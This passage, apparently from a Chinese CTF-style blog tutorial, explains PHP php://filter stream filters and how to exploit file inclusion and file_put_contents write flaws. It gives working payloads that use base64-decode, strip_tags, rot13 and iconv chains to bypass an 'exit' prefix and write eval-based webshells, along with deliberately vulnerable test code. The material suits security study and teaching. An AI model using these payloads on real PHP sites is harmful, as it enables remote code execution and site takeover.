class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 字符串过滤器</span><br>string.rot13       <span class="hljs-regexp">//</span>rot13转换<br>string.toupper     <span class="hljs-regexp">//</span>将字符大写<br>string.tolower     <span class="hljs-regexp">//</span>将字符小写<br>string.strip_tags  <span class="hljs-regexp">//</span>去除空字符、HTML和PHP标记后的结果<br><br><span class="hljs-comment"># 转换过滤器</span><br>convert.base64-encode       <span class="hljs-regexp">//</span>base64编码<br>convert.base64-decode       <span class="hljs-regexp">//</span>base64解码<br>convert.quoted-printable-encode <span class="hljs-regexp">//</span>quoted-printable编码<br>convert.quoted-printable-decode <span class="hljs-regexp">//</span>quoted-printable解码<br>convert.iconv                   <span class="hljs-regexp">//</span>实现任意两种编码之间的转换<br><br><span class="hljs-comment"># 压缩过滤器</span><br>zlib.deflate       <span class="hljs-regexp">//</span>压缩过滤器<br>zlib.inflate       <span class="hljs-regexp">//</span>解压过滤器<br>bzip2.compress     <span class="hljs-regexp">//</span>压缩过滤器<br>bzip2.decompress   <span class="hljs-regexp">//</span>解压过滤器<br><br><span class="hljs-comment"># 加密过滤器</span><br>mcrypt.*    <span class="hljs-regexp">//</span>加密过滤器<br>mdecrypt.*  <span class="hljs-regexp">//</span>解密过滤器<br><br></code></pre></td></tr></table></figure><p>用来测试的源代码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>flag.php</p><p><img src="D:/mdimage/20201026234419943.png" alt="在这里插入图片描述"> </p><h3 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h3><h4 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h4><p>str_rot13 — 对字符串执行 ROT13 转换. ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.rot13/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"> </p><h4 id="string-toupper，strtoupper"><a href="#string-toupper，strtoupper" class="headerlink" title="string.toupper，strtoupper"></a>string.toupper，strtoupper</h4><p>将字符串转化为大写</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.toupper/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-16660921967607.png" alt="在这里插入图片描述"> </p><h4 id="string-tolower，strtolower"><a href="#string-tolower，strtolower" class="headerlink" title="string.tolower，strtolower"></a>string.tolower，strtolower</h4><p>将字符串转化为小写</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.tolower/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609221798310.png" alt="在这里插入图片描述"> </p><h4 id="string-strip-tags，strip-tags"><a href="#string-strip-tags，strip-tags" class="headerlink" title="string.strip_tags，strip_tags"></a>string.strip_tags，strip_tags</h4><p> 从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。</p><blockquote><p>注意：HTML标签和 PHP 标签<code>&lt;?代码?&gt;</code>也会被去除。这里是硬编码处理的，所以无法通过 allowable_tags 参数进行改变。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609224764216.png" alt="在这里插入图片描述"> </p><p>php标签里所有东西都会被去除，html只有标签会被去除，里面的文字不会删除。</p><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609226805119.png" alt="在这里插入图片描述"> </p><h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><h4 id="convert-base64"><a href="#convert-base64" class="headerlink" title="convert.base64"></a>convert.base64</h4><p><code>convert.base64-encode</code>和<code>convert.base64-decode</code>使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 </p><blockquote><p>base-decode有这么一些注意事项</p><p>1、base64解码时是4bytes一组，因此将目标字符解码成乱码时需手动添加字符凑够4的倍数</p><p>2、<code>convert.base64-decode</code>过滤器读文件时会将一些非base64字符给过滤掉后再进行<code>decode</code>，和一些过滤器组合可以用来删除文件内容</p></blockquote><p>这个过滤器经常使用，base64加密，利用姿势：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609230142422.png" alt="在这里插入图片描述"> </p><h4 id="convert-quoted"><a href="#convert-quoted" class="headerlink" title="convert.quoted"></a>convert.quoted</h4><h5 id="convert-quoted-printable-encode"><a href="#convert-quoted-printable-encode" class="headerlink" title="convert.quoted-printable-encode"></a>convert.quoted-printable-encode</h5><p>将 8-bit 字符串转换成 quoted-printable 字符串</p><blockquote><p>8-bit字符串：10000000<del>11111111，即ASCII值在128</del>255之间的字符串</p><p>quoted-printable 字符串：<code>=十六进制形式</code>，如&#x3D;42为B</p></blockquote><h5 id="convert-quoted-printable-decode"><a href="#convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-decode"></a>convert.quoted-printable-decode</h5><p>将 quoted-printable 字符串转换为 8-bit 字符串</p><blockquote><p>注意：可以转化从&#x3D;00到&#x3D;FF，即ASCII值从0~255之间的字符串</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.quoted-printable-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609234336925.png" alt="在这里插入图片描述"> </p><h5 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h5><p>简单来说转换编码用的</p><p>以下是两种使用方法</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">convert</span>.iconv.当前编码.目标编码<br>or <br><span class="hljs-built_in">convert</span>.iconv.当前编码/目标编码<br></code></pre></td></tr></table></figure><p>以下是支持的字符集</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br><span class="hljs-attribute">UTF7</span>-IMAP<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br><span class="hljs-attribute">ASCII</span>*<br></code></pre></td></tr></table></figure><blockquote><p>* 表示该编码也可以在正则表达式中使用。 ** 表示该编码自 <strong>PHP</strong> 5.4.0 始可用。</p></blockquote><p>利用姿势：把flag.php的内容从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609239702328.png" alt="在这里插入图片描述"> </p><h3 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h3><h4 id="zlib-deflate压缩、zlib-inflate解压"><a href="#zlib-deflate压缩、zlib-inflate解压" class="headerlink" title="zlib.deflate压缩、zlib.inflate解压"></a>zlib.deflate压缩、zlib.inflate解压</h4><blockquote><p>自 PHP 5.1.0 起，在激活 zlib的前提下可用。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用。</p></blockquote><p>相对于压缩封装协议可以在本地文件系统中 创建 gzip 和 bz2 兼容文件，但不可以在网络的流中提供通用压缩的意思，也不可以将一个非压缩的流转换成一个压缩流。压缩过滤器zlib.*可以在任何时候应用于任何流资源。</p><blockquote><p>注意: 压缩过滤器不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/zlib.deflate/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609243591531.png" alt="在这里插入图片描述"> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/zlib.deflate|zlib.inflate/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70-166609245545634.png" alt="在这里插入图片描述"> </p><p>下面是一个实例</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">0</span>deval(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">/resource=Cyc1e.php</span><br></code></pre></td></tr></table></figure><h4 id="bzip2-compress、bzip2-decompress"><a href="#bzip2-compress、bzip2-decompress" class="headerlink" title="bzip2.compress、bzip2.decompress"></a>bzip2.compress、bzip2.decompress</h4><p>自PHP 5.1.0 起，在激活 bz2支持的前提下可用。也可以通过安装来自 » PECL的 » bz2_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中不可用。</p><p>工作方式与上面相同</p><h3 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h3><h4 id="mcrypt-、mdecrypt"><a href="#mcrypt-、mdecrypt" class="headerlink" title="mcrypt.*、mdecrypt.*"></a>mcrypt.*、mdecrypt.*</h4><p><code>mcrypt.*</code>和 <code>mdecrypt.*</code>使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为 <code>mcrypt.ciphername</code>，其中 <code>ciphername</code>是密码的名字，将被传递给 <code>mcrypt_module_open()。</code></p><p>过滤器参数</p><table><thead><tr><th align="left">参数</th><th align="left">是否必须</th><th align="left">默认值</th><th align="left">取值举例</th></tr></thead><tbody><tr><td align="left">mode</td><td align="left">可选</td><td align="left">cbc</td><td align="left">cbc, cfb, ecb, nofb, ofb, stream</td></tr><tr><td align="left">algorithms_dir</td><td align="left">可选</td><td align="left">ini_get(‘mcrypt.algorithms_dir’)</td><td align="left">algorithms 模块的目录</td></tr><tr><td align="left">modes_dir</td><td align="left">可选</td><td align="left">ini_get(‘mcrypt.modes_dir’)</td><td align="left">modes 模块的目录</td></tr><tr><td align="left">iv</td><td align="left">必须</td><td align="left">N&#x2F;A</td><td align="left">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr><tr><td align="left">key</td><td align="left">必须</td><td align="left">N&#x2F;A</td><td align="left">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr></tbody></table><h2 id="单一过滤器的情况"><a href="#单一过滤器的情况" class="headerlink" title="单一过滤器的情况"></a>单一过滤器的情况</h2><p>下面payload都省略了write参数，因为在使用<code>file_put_contents</code>函数时会自动使用write参数。</p><h3 id="绕过不同变量"><a href="#绕过不同变量" class="headerlink" title="绕过不同变量"></a>绕过不同变量</h3><p>测试代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$content</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p><h4 id="方法一-base64编码"><a href="#方法一-base64编码" class="headerlink" title="方法一(base64编码)"></a>方法一(base64编码)</h4><p>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php:&#x2F;&#x2F;filter协议来施展魔法：使用php:&#x2F;&#x2F;filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p><p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br><span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode 来首先对其解码。在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p><p><img src="D:\mdimage\image-20221016203453907.png" alt="image-20221016203453907"> </p><p><img src="D:\mdimage\image-20221016203436236.png" alt="image-20221016203436236"> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">txt=aPD9waHAgZXZhbCgkX1BPU1RbJ0EnXSk7ID8+&amp;filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.base64-decode/</span>resource=shell.php<br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\image-20221016203518644.png" alt="image-20221016203518644"> </p><p>成功加载</p><h4 id="方法二（string-strip-tags）"><a href="#方法二（string-strip-tags）" class="headerlink" title="方法二（string.strip_tags）"></a>方法二（string.strip_tags）</h4><p>其实，除了使用base64特性的方法外，我们还可以利用php:&#x2F;&#x2F;filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p><p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。</p><p>编写如下测试代码即可查看 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D;php:&#x2F;&#x2F;input 的效果：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">echo readfile(&#x27;php<span class="hljs-symbol">://filter/read=string</span>.strip_tags/resource=php<span class="hljs-symbol">://input</span>&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\thum-499a1469385895.png" alt="QQ截图20160725010403.png"> </p><p>解释一下<code>string.strip_tags</code></p><p>strip_tags — 从字符串中去除 HTML 和 PHP 标记。该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。</p><p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p><p>万幸的是，php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p><p>最终的数据包如下：</p><p><img src="D:\mdimage\image-20221016203825931.png" alt="image-20221016203825931"> </p><p><img src="D:\mdimage\image-20221016203840352.png" alt="image-20221016203840352"> </p><p><img src="D:/mdimage/image-20221112155449760.png" alt="image-20221112155449760"> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">txt=PD9waHAgZXZhbCgkX1BPU1RbJ0EnXSk7ID8+&amp;filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.strip_tags|convert.base64-decode/</span>resource=shell.php<br></code></pre></td></tr></table></figure><h4 id="方法三-string-rot13"><a href="#方法三-string-rot13" class="headerlink" title="方法三(string.rot13)"></a>方法三(string.rot13)</h4><p>str_rot13() 函数对字符串执行 ROT13 编码。 ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。 编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串</p><p>利用php:&#x2F;&#x2F;filter中string.rot13过滤器去除”exit”。string.rot13的特性是编码和解码都是自身完成，利用这一特性可以去除exit。<code>&lt;?php exit;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg();</code>，不过这种利用手法的前提是PHP不开启short_open_tag。</p><p><strong>条件：short_open_tag&#x3D;off</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.rot13/</span>resource=tyskill.php&amp;content=&lt;?cuc cucvasb();<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221018185853627.png" alt="image-20221018185853627"> </p><p>成功写入并执行</p><p>具体要使用的时候就改变后面的<code>&lt;?cuc cucvasb();</code>，用hackerbar编码即可</p><p><img src="D:/mdimage/image-20221018190110538.png" alt="image-20221018190110538"> </p><h4 id="方法四-convert-iconv"><a href="#方法四-convert-iconv" class="headerlink" title="方法四(convert.iconv.*)"></a>方法四(convert.iconv.*)</h4><p><code>&lt;?php exit();</code>字符一共13位</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># usc-2: 对目标字符串进行2位一反转</span><br>?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=tyskill.php&amp;content=tyskill?&lt;hp phpipfn(o;)<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221018185645933.png" alt="image-20221018185645933"> </p><p>均能成功生成文件并且执行</p><p>使用方法可以参考前面的过滤器介绍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$A</span>=<span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>,<span class="hljs-string">&quot;UCS-2BE&quot;</span>,<span class="hljs-string">&quot;&lt;?php phpinfo();&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$A</span>;<br></code></pre></td></tr></table></figure><h3 id="绕过相同变量"><a href="#绕过相同变量" class="headerlink" title="绕过相同变量"></a>绕过相同变量</h3><h4 id="base64（还没搞明白）"><a href="#base64（还没搞明白）" class="headerlink" title="base64（还没搞明白）"></a>base64（还没搞明白）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：都是为了去除文件头部内容exit这个关键代码写入shell后门。</p><p>直接来一波构造base64好吧</p><p>或者下面这一个也可以</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=PD9waHAgcGhwaW5mbygpOz8+.php<br></code></pre></td></tr></table></figure><p>这样一来拼接起来就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>();php:<span class="hljs-comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span><br></code></pre></td></tr></table></figure><p>然后进行一个整体的base64解码从而分解掉死亡代码</p><p><img src="D:/mdimage/image-20221017184408798.png" alt="image-20221017184408798"> </p><p>文件是创建成功了的，但是却无法写入内容</p><p>问题在于resource 后边的<code>=</code>；</p><p><code>=</code>在base64中的作用是填充，也就是以为着结束；在<code>=</code>的后面是不允许有任何其他字符的否则会报错，</p><p>所以想办法去掉等号</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=PD9waHAgcGhwaW5mbygpOz8+.php<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags|convert.base64-decode/</span>resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>B.php<br>上面那个是对照看的<br></code></pre></td></tr></table></figure><p>如上所示，我们用<code>string.strip_tags</code>，并且使用?&gt;闭合我们的php语句</p><p><img src="D:/mdimage/1615988348_6052067c39528ab8a8048.jpeg" alt="0KI8vd.png"> </p><p>在服务器上创建是可以看到的</p><p><img src="D:/mdimage/image-20221017190827299.png" alt="image-20221017190827299"> </p><p>但是浏览器访问不到了</p><p>我们发现文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags|convert.base64-decode/</span>resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>B<span class="hljs-regexp">/../</span>shell.php<br></code></pre></td></tr></table></figure><p>这个绕过不同变量好奇怪一直在本机上行不通</p><h4 id="方法一-string-rot13"><a href="#方法一-string-rot13" class="headerlink" title="方法一(string.rot13)"></a>方法一(string.rot13)</h4><p>此时由于<code>//</code>的注释效果，我们需要添加%0a换行从而执行php代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.rot13|%0a&lt;?cuc cucvasb();|/</span>resource=tyskill.php<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>|/resource=Cyc1e.php<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221018200641667.png" alt="image-20221018200641667"> </p><p>创建成功，执行成功</p><h4 id="方法二-convert-iconv"><a href="#方法二-convert-iconv" class="headerlink" title="方法二(convert.iconv.*)"></a>方法二(convert.iconv.*)</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># usc-2: 对目标字符串进行2位一反转</span><br>?content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UCS-2LE.UCS-2BE|tyskill?&lt;hp 